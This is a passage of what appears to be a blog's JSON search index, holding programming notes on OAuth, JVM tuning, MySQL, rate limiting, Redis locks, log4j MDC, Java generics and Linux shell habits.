      "content": "架构设计中考量的是Non Functional factors Response Time     处理一次请求的时间或者平均时间   Throughput      一般以 hits per second or transactions per second 度量   Scalability      Scale up(Vertical Scalability) and Scale out ( horizontal scalability )     Vertical Scalability我的理解是提高服务器硬件配置比如CPU和内存，同时也包括在一台物理机上部署多个Server。而Horizontal Scalability我的理解是集群之类的方案。集群环境下并不会随着集群中Node的增加Throughput也会线性的增加。因为集群也会引入Cluster node 的management Overhead，并且随着集群中Node节点的增加，必然让后端的database或者EIS成为瓶颈。有时候Performance和Scalability是有冲突的，比如Cluster环境下Session复制问题。如果不考虑Scalability，单机上存储session性能会不错。如果考虑到扩展性采用集群，把session放到数据库中，程序的扩展性提高了，但数据库访问必然影响了性能。 ",
      "url"      : "http://localhost:4000/2017/02/18/non-functional-requirement/"
    } ,
  
    {
      "title"    : "OpenID and OAuth",
      "category" : "iteye",
      "content": "OpenID and OAuth From http://cakebaker.42dh.com/2008/04/01/openid-versus-oauth-from-the-users-perspective/ In this article I want to show the differences between OpenID and its younger cousin OAuth by providing for each a typical user scenario. First the scenario for OpenID: User wants to access his account on example.com. example.com (the “Relying Party” in OpenID lingo) asks the user for his OpenID. User enters his OpenID. example.com redirects the user to his OpenID provider. User authenticates himself to the OpenID provider. OpenID provider redirects the user back to example.com. example.com allows the user to access his account And now the scenario for OAuth: User is on example.com and wants to import his contacts from mycontacts.com. example.com (the “Consumer” in OAuth lingo) redirects the user to mycontacts.com (the “Service Provider”). User authenticates himself to mycontacts.com (which can happen by using OpenID) mycontacts.com asks the user whether he wants to authorize example.com to access his contacts. User makes his choice mycontacts.com redirects the user back to example.com. example.com retrieves the contacts from mycontacts.com. example.com informs the user that the import was successful. From those scenarios we can see that OpenID is about authentication (i.e. I can identify myself with an url) whereas OAuth is about authorization (i.e. I can grant permission to access my data on some website to another website, without providing this website the authentication information for the original website). ",
      "url"      : "http://localhost:4000/2017/02/18/openid-oauth/"
    } ,
  
    {
      "title"    : "JDK Summary",
      "category" : "diary",
      "content": "JDK ###JMM -XX:NewRatio -XX:NewRatio=4表示年轻代与年老代所占比值为1:4,年轻代占整个堆栈的1/5 Xms=Xmx并且设置了Xmn的情况下，该参数不需要进行设置。 -XX:SurvivorRatio 设置为8,则两个Survivor区与一个Eden区的比值为2:8,一个Survivor区占整个年轻代的1/10 -Xmn eden + 2 survivor space -Xss JDK5.0以后每个线程堆栈大小为1M,以前每个线程堆栈大小为256K. GC reference count 引用计数 tracing GC(root set 对象可达性） promotion failed &amp; concurrent mode failure 对于采用CMS进行老年代GC的程序而言，尤其要注意GC日志中是否有promotion failed和concurrent mode failure两种状况，当这两种状况出现时可能 会触发Full GC。 promotion failed是在进行Minor GC时，survivor space放不下、对象只能放入老年代，而此时老年代也放不下造成的； concurrent mode failure是在执行CMS GC的过程中同时有对象要放入老年代，而此时老年代空间不足造成的（有时候“空间不足”是CMS GC时当前的浮动垃圾过多导致暂时性的空间不足触发Full GC）。 应对措施为：增大survivor space、老年代空间或调低触发并发GC的比率，但在JDK 5.0+、6.0+的版本中有可能会由于JDK的bug29导致CMS在remark完毕 后很久才触发sweeping动作。对于这种状况，可通过设置-XX: CMSMaxAbortablePrecleanTime=5（单位为ms）来避免。 ",
      "url"      : "http://localhost:4000/2017/03/15/2017-3-15-diary-jdk_summary/"
    } ,
  
    {
      "title"    : "MySQL summary",
      "category" : "diary",
      "content": "MySQL summary 索引 从两个维度来看： 普通索引 唯一索引 主键索引 组合索引 索引遵循最左匹配规则 函数索引 mysql不支持 B+树索引 hash索引 只能是等值查询 不支持范围查询 内存DB中用的多一些？ Covering Index(覆盖索引） 在Explain的时候，输出的Extra信息中如果有“Using Index”，就表示这条查询使用了覆盖索引 覆盖索引(covering index)，MySQL只需要通过索引就可以返回查询所需要的数据，而不必在查到索引之后再去查询数据 不要select *, 应该select 覆盖索引中指定的字段 FULLTEXT全文索引 CPU负载高问题分析 slow SQL mysql&gt; show variables like '%slow%'; | Variable_name | Value | | ------------  | ------ | 　log_slow_queries | ON 　slow_launch_time | 2 　 最大连接数 mysql&gt; show variables like 'max_connections'; 　　+-----------------+-------+ 　　| Variable_name | Value | 　　+-----------------+-------+ 　　| max_connections | 256 | 　　+-----------------+-------+　 显示连接 mysql&gt; show full processlist; +---------+-------------+--------------------+----------------+-------------+-------+-----------------------------------------------------------------------+-----------------------+ | Id | User  | Host   | db   | Command  | Time | State            | Info   | +---------+-------------+--------------------+----------------+-------------+-------+-----------------------------------------------------------------------+-----------------------+ | 1056536 | replication | 192.168.6.91:38417 | NULL   | Binlog Dump | 33759 | Master has sent all binlog to slave; waiting for binlog to be updated | NULL   | | 1107067 | miaohr | 192.168.6.81:32024 | NULL   | Query  |  0 | NULL           | show full processlist | | 1107182 | miaohr | 192.168.6.91:44217 | hr_db_business | Sleep  |  1 |             | NULL   | 显示状态 mysql&gt; show status; +------------------------------------------+----------------------+ | Variable_name     | Value   | +------------------------------------------+----------------------+ | Aborted_clients     | 777   | | Aborted_connects     | 16    | | Binlog_cache_disk_use    | 532   | ",
      "url"      : "http://localhost:4000/2017/03/16/diary-MySQL-summary/"
    } ,
  
    {
      "title"    : "流控",
      "category" : "infra",
      "content": "服务化过程中各种流控策略 计数器 滑动窗口 控制并发 信号量 Semaphore semphore = new Semaphore(10);  if(semphore.getQueueLength() &gt; 10){ //等待队列阀值为10时  return;  }  try { semphore.acquire(); //干活 } catch (InterruptedException e) { e.printStackTrace(); }finally{ semphore.release();//释放 } 控制速率 令牌桶 在 Wikipedia 上，令牌桶算法是这么描述的： 每秒会有 r 个令牌放入桶中，或者说，每过 1/r 秒桶中增加一个令牌 桶中最多存放 b 个令牌，如果桶满了，新放入的令牌会被丢弃 当一个 n 字节的数据包到达时，消耗 n 个令牌，然后发送该数据包 如果桶中可用令牌小于 n，则该数据包将被缓存或丢弃 令牌桶控制的是一个时间窗口内的通过的数据量，在 API 层面我们常说的 QPS、TPS，正好是一个时间窗口内的请求量或者事务量，只不过时间窗口限定在 1s 罢了。Java 语言，可以借助 Guava 的 RateLimiter 来实现基于令牌桶的流控。RateLimiter 对简单的令牌桶算法做了一些工程上的优化，具体的实现是 SmoothBursty。SmoothBursty 有一个可以放 N 个时间窗口产生的令牌的桶，系统空闲的时候令牌就一直攒着，最好情况下可以扛 N 倍于限流值的高峰而不影响后续请求。RateLimiter 允许某次请求拿走超出剩余令牌数的令牌，但是下一次请求将为此付出代价，一直等到令牌亏空补上，并且桶中有足够本次请求使用的令牌为止。 需要注意的是，RateLimiter 的另一个实现 SmoothWarmingUp，就不是令牌桶了，而是漏桶算法。 出于简单起见，RateLimiter 中的时间窗口能且仅能为 1s，如果想搞其他时间单位的限流，只能另外造轮子。 漏桶 “漏桶算法”能够强行限制数据的传输速率， “令牌桶算法”在能够限制数据的平均传输数据外，还允许某种程度的突发传输。在“令牌桶算法”中，只要令牌桶中存在令牌，那么就允许突发地传输数据直到达到用户配置的上限，因此它适合于具有突发特性的流量。 ",
      "url"      : "http://localhost:4000/2017/03/24/infra/"
    } ,
  
    {
      "title"    : "分布式全局ID生成算法",
      "category" : "dal",
      "content": "twitter/snowflake 结构 snowflake的结构如下(每部分用-分开): 0 - 0000000000 0000000000 0000000000 0000000000 0 - 00000 - 00000 - 000000000000 第一位为未使用，接下来的41位为毫秒级时间(41位的长度可以使用69年)，然后是5位datacenterId和5位workerId(10位的长度最多支持部署1024个节点） ，最后12位是毫秒内的计数（12位的计数顺序号支持每个节点每毫秒产生4096个ID序号） 一共加起来刚好64位，为一个Long型。(转换成字符串长度为18) snowflake生成的ID整体上按照时间自增排序，并且整个分布式系统内不会产生ID碰撞（由datacenter和workerId作区分），并且效率较高。据说：snowflake每秒能够产生26万个ID。 Scala: scala实现 JAVA: Java实现 ",
      "url"      : "http://localhost:4000/2017/03/26/dal-snowflake/"
    } ,
  
    {
      "title"    : "log4j trace - MDC",
      "category" : "infra",
      "content": "在记录日志的时候，我们可能有这种需求，对于每个记录除了知道日志信息外，也要当前登录用户的信息。 可以这样解决：使用log4j的MDC 在web.xml加入 Filter： &lt;filter&gt; &lt;filter-name&gt;set log4j MDC for log2userId&lt;/filter-name&gt; &lt;filter-class&gt;UserFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;set log4j MDC for log2userId&lt;/filter-name&gt; &lt;url-pattern&gt; public class UserFilter implements Filter { &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Logger&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getLogger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;UserFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;DEFAULT_USERID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;anonymous&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;doFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServletResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;FilterChain&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServletException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpServletRequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;HttpSession&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSession&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt;  &lt;span class=&quot;no&quot;&gt;MDC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;userId&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;DEFAULT_USERID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;nc&quot;&gt;Customer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;customer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Customer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAttribute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;customer&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;customer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt;   &lt;span class=&quot;no&quot;&gt;MDC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;userId&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;DEFAULT_USERID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;no&quot;&gt;MDC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;userId&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;customer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getLoginid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test for MDC.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;doFilter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;FilterConfig&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServletException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// do nothing&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;destroy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; //  do nothing } } 在log4j.properties中加入新配置，示例使用jdbc存储 log4j.appender.db=org.apache.log4j.jdbc.JDBCAppender log4j.appender.db.URL=jdbc:ulr log4j.appender.db.driver=org.hsqldb.jdbcDriver log4j.appender.db.user=sa log4j.appender.db.password= log4j.appender.db.sql=INSERT INTO LOG4J_MSG (LOGINID,PRIORITY,LOGDATE,CLASS,METHOD,MSG) VALUES('%X{userId}','%p','%d{yyyy-MM-dd HH:mm:ss}','%C','%M','%m') %X{userId}：就是取出MDC的代码了 ",
      "url"      : "http://localhost:4000/2017/03/27/log4j-MDC/"
    } ,
  
    {
      "title"    : "redis分布式锁 - redlock",
      "category" : "midware",
      "content": "摘自：http://mushroom.cnblogs.com/ 单机Redis分布式锁 # 加锁 SET resource_name my_random_value NX PX 30000 # 释放锁 if redis.call(get,KEYS[1]) == ARGV[1] then  return redis.call(del,KEYS[1])  else  return 0  end argv[1]需要是random value，避免误删别的客户端锁。问题场景如下： A客户端拿到对象锁，但在因为一些原因被阻塞导致无法及时释放锁。 因为过期时间已到，Redis中的锁对象被删除。 B客户端请求获取锁成功。 A客户端此时阻塞操作完成，删除key释放锁（B的锁） C客户端请求获取锁成功。 这时B、C都拿到了锁，因此分布式锁失效。 单机分布式锁是单点，redis主从复制是异步的有延迟。问题场景如下： 客户端A在master节点拿到了锁。 master节点在把A创建的key写入slave之前宕机了。 slave变成了master节点 4.B也得到了和A还持有的相同的锁（因为原来的slave里还没有A持有锁的信息） Redlock 在多台master情况下实现这个算法，并保证锁的安全性。 步骤如下： 客户端以毫秒为单位获取当前时间。 使用同样key和值，循环在多个实例中获得锁。 为了获得锁，客户端应该设置个偏移时间，它小于锁自动释放时间(即key的过期时间)。 举个例子来说，如果一个锁自动释放时间是10秒，那偏移时间应该设置在5~50毫秒的范围。 防止因为某个实例崩溃掉或其他原因，导致client在获取锁时耗时过长。 计算获取所有锁的耗时，即当前时间减去开始时间，得到a值。 用锁自动释放时间减去a值，在减去偏移时间，得到c值，如果获取锁成功的实例数量大于实际的数量一半，并且c大于0，那么锁就被获取成功。 锁获取成功，锁对象的有效时间是上面的c值。 若是客户端因为一些原因获取失败，原因可能是上面的c值为负数或者锁成功的数量小于实例数，以用N/2+1当标准(N为实例数)。 那么会释放所有实例上的锁。 //锁自动释放时间 TimeSpan ttl=new TimeSpan(0,0,0,30000) //获取锁成功的数量 int n = 0; //记录开始时间 var startTime = DateTime.Now; //在每个实例上获取锁 for_each_redis( redis =&gt; { if (LockInstance(redis, resource, val, ttl)) n += 1; } ); //偏移时间是锁自动释放时间的1%，根据上面10s是5-50毫秒推出。 var drift = Convert.ToInt32(ttl.TotalMilliseconds * 0.01); //锁对象的有效时间=锁自动释放时间-(当前时间-开始时间)-偏移时间 var validity_time = ttl - (DateTime.Now - startTime) - new TimeSpan(0, 0, 0, 0, drift); //判断成功的数量和有效时间c值是否大于0 if (n &gt;= (N/2+1) &amp;&amp; validity_time.TotalMilliseconds &gt; 0) { } ",
      "url"      : "http://localhost:4000/2017/03/28/redis-redlock/"
    } ,
  
    {
      "title"    : "消息事务",
      "category" : "midware",
      "content": "消息事务 参考： https://github.com/zjpjohn/ReliableMeageSystem 消息记录和业务DB在一个库中，业务DB操作完成后（事务完成后），开始发送消息。需要用到Spring中的事务同步TransactionSynchronizationAdapter MessageProducer  public void sendMessage(Map&lt;String, String&gt; data) {  Preconditions.checkArgument(data != null &amp;&amp; data.size() != 0, message must not be empty...);  transactionSynchronize();  QMessage message = convertMessage(data);  int result = qMessageService.addQMessage(message);  if (result != 0) {   MessageHolder.set(message.getMessageId());  }  } /** * 添加事务同步 */  private void transactionSynchronize() {  MessageTransactionSynchronizationAdapter synchronizationAdapter = new MessageTransactionSynchronizationAdapter();  synchronizationAdapter.setqMessageService(qMessageService);  synchronizationAdapter.setTransactionMessageProducer(transactionMessageProducer);  TransactionSynchronizationManager.registerSynchronization(synchronizationAdapter);  } MessageTransactionSynchronizationAdapter  @Override  public void afterCompletion(int status) {  try {   if (STATUS_COMMITTED == status) {    List&lt;String&gt; messageIds = MessageHolder.get();    sendMessageToBroker(messageIds);   } else if (STATUS_ROLLED_BACK == status) {    log.warn(事务提交失败，数据库回滚后，清空缓存中的消息：{}, MessageHolder.get());   }  } finally {   MessageHolder.clear();  }  } TransactionMessageProducer public void sendMessage(QMessage qMessage) {  Session session = null;  try {   session = connection.createSession(qMessage.getTransaction() != 0, ActiveMQSession.AUTO_ACKNOWLEDGE);   //????????   Queue queue = session.createQueue(qMessage.getDestination());   //?????????????   MessageProducer producer = session.createProducer(queue);   producer.setDeliveryMode(qMessage.getPersistent() != 0 ? DeliveryMode.PERSISTENT : DeliveryMode.NON_PERSISTENT);   //???????   MapMessage message = session.createMapMessage();   message.setString(messageId, qMessage.getMessageId());   message.setString(data, qMessage.getMessageContent());   message.setString(timeStamp, String.valueOf(qMessage.getTimeStamp()));   //????????n2????????????   if (qMessage.getN2() != 0) {    if (StringUtils.isNotBlank(qMessage.getBusinessMark())) {    message.setString(businessMark, qMessage.getBusinessMark());    } else {    //???n2??????????businessMark?????????    throw new RuntimeException(n2 level message require businessMark not empty...);    }   }   //???????   producer.send(message);   //????????????   if (qMessage.getTransaction() != 0) {    session.commit();   }   //?????broker??????   messageCallback.onSuccess(qMessage.getMessageId());  } catch (JMSException e) {   log.error(send message to broker error:{}, e);   messageCallback.onFail(e,qMessage.getMessageId());  } finally {   if (session != null) {    try {    session.close();    } catch (JMSException e) {    log.error(close session error:{}, e);    }   }  }  } ",
      "url"      : "http://localhost:4000/2017/03/28/2017-3-28-trx-msg/"
    } ,
  
    {
      "title"    : "java 泛型 - 上界，下界",
      "category" : "jdk",
      "content": "少有的讲得比较清楚的 :( 泛型通配符&lt;? extends T&gt;来接收返回的数据，此写法的泛型集合不能使用 add 方法，而&lt;? super T&gt;不能使用 get 方法，做为接口调用赋值时易出错。 说明：扩展说一下 PECS(Producer Extends Consumer Super)原则： 频繁往外读取内容的，适合用上界 Extends。 经常往里插入的，适合用下界 Super。 几个具体的例子（注：java.util.java是java.sql.Timestamp的父类） # 上界用extends关键字声明，表示参数化的类型可能是所指定的类型，或者是此类型的子类 public void upperBound(List&lt;? extends Date&gt; list, Date date) {  Date now = list.get(0);  System.out.println(now==&gt; + now);  //list.add(date); //这句话无法编译  list.add(null);//这句可以编译，因为null没有类型信息  } public void testUpperBound() { List&lt;Timestamp&gt; list = new ArrayList&lt;Timestamp&gt;(); Date date = new Date(); upperBound(list,date); } # 泛型方法解决方法上面add问题 public &lt;T extends Date&gt; void upperBound2(List&lt;T&gt; list, T date) { list.add(date); } public void testUpperBound2() { List&lt;Timestamp&gt; list = new ArrayList&lt;Timestamp&gt;(); Date date = new Date(); Timestamp time = new Timestamp(date.getTime()); upperBound2(list,time); //upperBound2(list,date);//这句同样无法编译  } # 下界用super进行声明，表示参数化的类型可能是所指定的类型，或者是此类型的父类型，直至Object public void lowerBound(List&lt;? super Timestamp&gt; list) { Timestamp now = new Timestamp(System.currentTimeMillis()); list.add(now); //下面语句不能编译，类型察除后变为：Timestamp time = (Timestamp)list.get(0); //Timestamp time = list.get(0); } public void testLowerBound() { List&lt;Date&gt; list = new ArrayList&lt;Date&gt;(); list.add(new Date()); lowerBound(list); } 参考 阿里java规范 http://fyting.iteye.com/blog/122732 ",
      "url"      : "http://localhost:4000/2017/04/04/jdk-generic-extends-upper/"
    } ,
  
    {
      "title"    : "linux best practice",
      "category" : "linux",
      "content": "Linux习惯 在单个命令中创建目录树。 更改路径,不要移动存档。 将命令与控制操作符组合使用。 谨慎引用变量。 使用转义序列来管理较长的输入。 在列表中对命令分组。 在 find 之外使用 xargs 。 了解何时 grep 应该执行计数——何时应该绕过。 匹配输出中的某些字段，而不只是对行进行匹配。 停止对 cat 使用管道。 在单个命令中创建目录树 ~ $ mkdir -p tmp/a/b/c   ~ $ mkdir -p project/{lib/ext,bin,src,doc/{html,info,pdf},demo/stat/a} 更改路径,不要移动存档 ~ $ tar xvf -C tmp/a/b/c newarc.tar.gz 将命令与控制操作符组合使用 ~ $ cd tmp/a/b/c &amp;&amp; tar xvf ~/archive.tar   ~ $ cd tmp/a/b/c || mkdir -p tmp/a/b/c   ~ $ cd tmp/a/b/c || mkdir -p tmp/a/b/c &amp;&amp; tar xvf -C tmp/a/b/c ~/archive.tar 谨慎引用变量 始终要谨慎使用 Shell 扩展和变量名称。一般最好将变量调用包括在双引号中，除非您有不这样做的足够理由。类似地，如果您直接在字母数字文本后面使用变量名称，则还要确保将该变量名称包括在方括号 ([]) 中，以使其与周围的文本区分开来。否则，Shell 将把尾随文本解释为变量名称的一部分——并且很可能返回一个空值。清单 8 提供了变量的各种引用和非引用及其影响的示例。 ~ $ ls tmp/ a b ~ $ VAR=&quot;tmp/*&quot; ~ $ echo $VAR tmp/a tmp/b ~ $ echo &quot;$VAR&quot; tmp/* ~ $ echo $VARa ~ $ echo &quot;$VARa&quot; ~ $ echo &quot;${VAR}a&quot; tmp/*a ~ $ echo ${VAR}a tmp/a ~ $ 将反斜杠用于长输入 ~ $ cd tmp/a/b/c ||    &gt; mkdir -p tmp/a/b/c &amp;&amp;    &gt; tar xvf -C tmp/a/b/c ~/archive.tar   或者，也可以使用以下配置： 清单 10. 好习惯 5 的替代示例：将反斜杠用于长输入   ~ $ cd tmp/a/b/c    &gt;    ||    &gt; mkdir -p tmp/a/b/c    &gt;    &amp;&amp;    &gt; tar xvf -C tmp/a/b/c ~/archive.tar 在列表中对命令分组 在 Subshell 中运行命令列表 ~ $ ( cd tmp/a/b/c/ || mkdir -p tmp/a/b/c &amp;&amp;    &gt; VAR=$PWD; cd ~; tar xvf -C $VAR archive.tar )    &gt; | mailx admin -S &quot;Archive contents&quot; 在此示例中，该存档的内容将提取到 tmp/a/b/c/ 目录中，同时将分组命令的输出（包括所提取文件的列表）通过邮件发送到地址 admin。 当您在命令列表中重新定义环境变量，并且您不希望将那些定义应用于当前 Shell 时，使用 Subshell 更可取。 在当前 Shell 中运行命令列表 将命令列表用大括号 ({}) 括起来，以在当前 Shell 中运行。确保在括号与实际命令之间包括空格，否则 Shell 可能无法正确解释括号。此外，还要确保列表中的最后一个命令以分号结尾. 在 find 之外使用 xargs ~ $ find some-file-criteria some-file-path |    &gt; xargs some-great-command-that-needs-filename-arguments ~/tmp $ ls -1 | xargs December_Report.pdf README a archive.tar mkdirhier.sh ~/tmp $ ls -1 | xargs file December_Report.pdf: PDF document, version 1.3 README: ASCII text a: directory archive.tar: POSIX tar archive mkdirhier.sh: Bourne shell script text executable ~/tmp $ 了解何时 grep 应该执行计数——何时应该绕过 避免通过管道将 grep 发送到 wc -l 来对输出行数计数。grep 的 -c 选项提供了对与特定模式匹配的行的计数，并且一般要比通过管道发送到 wc 更快 ~ $ time grep and tmp/a/longfile.txt | wc -l 2811 real 0m0.097s user 0m0.006s sys  0m0.032s ~ $ time grep -c and tmp/a/longfile.txt 2811 real 0m0.013s user 0m0.006s sys  0m0.005s ~ $ 除了速度因素外，-c 选项还是执行计数的好方法。对于多个文件，带 -c 选项的 grep 返回每个文件的单独计数，每行一个计数，而针对 wc 的管道则提供所有文件的组合总计数。 然而，不管是否考虑速度，此示例都表明了另一个要避免地常见错误。这些计数方法仅提供包含匹配模式的行数——如果那就是您要查找的结果，这没什么问题。但是在行中具有某个特定模式的多个实例的情况下，这些方法无法为您提供实际匹配实例数量 的真实计数。归根结底，若要对实例计数，您还是要使用 wc 来计数。 匹配输出中的某些字段，而不只是对行进行匹配 当您只希望匹配输出行中特定字段 中的模式时，诸如 awk 等工具要优于 grep。 下面经过简化的示例演示了如何仅列出 12 月修改过的文件。 清单 19. 坏习惯 9 的示例：使用 grep 来查找特定字段中的模式 ~/tmp $ ls -l /tmp/a/b/c | grep Dec -rw-r--r-- 7 joe joe 12043 Jan 27 20:36 December_Report.pdf -rw-r--r-- 1 root root 238 Dec 03 08:19 README -rw-r--r-- 3 joe joe 5096 Dec 14 14:26 archive.tar ~/tmp $ 在此示例中，grep 对行进行筛选，并输出其修改日期和名称中带 